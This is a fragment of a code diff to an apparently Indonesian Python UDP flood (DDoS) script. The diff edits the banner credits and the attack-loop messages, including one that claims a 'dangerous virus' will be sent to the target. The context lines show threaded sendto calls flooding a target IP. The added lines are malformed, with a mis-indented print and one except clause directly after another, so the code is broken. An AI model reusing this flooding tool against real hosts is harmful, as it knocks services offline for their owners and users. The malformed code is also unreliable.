@@ -7,8 +7,8 @@ print("\033[1;33;40m")
 print( '''
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 ////////////////////////////////////////////////////////////
-                  WIBI&&RIDWAN
-                  Create Wibi&&Ridwan
+            Friend WIBI&&RIDWAN
+            Create Wibi&&Ridwan
 ____________________________________________________________
 ------------------------------------------------------------
 	''')
@@ -30,7 +30,11 @@ def run():
 				s.sendto(data,addr)
 			print(i +" \033[1;32;40mATTACK-------------------> \033[0;31;47m" + ip +"\033[0m")
 		except:
-			print("\033[1;34;40m[\033[1;31;40m!\033[1;34;40m] \033[0;31;47 DDOS Gagal di kirimkan          \033[0m")
+			print("\033[1;34;40m[\033[1;31;40m!\033[1;34;40m] \033[0;31;47 virus berbahaya akan dikirimkan ke target \033[0m")
+
+                        print(i +" \033[1;32;40mATTACK-------------------> \033[0;31;47m" + ip +"\033[0m")
+		except:
+			print("\033[1;34;40m[\033[1;31;40m!\033[1;34;40m] \033[0;31;47 pengiriman gagal periksa koneksi anda\033[0m")
 
 for y in range(threads):
 	if choice == 'y':
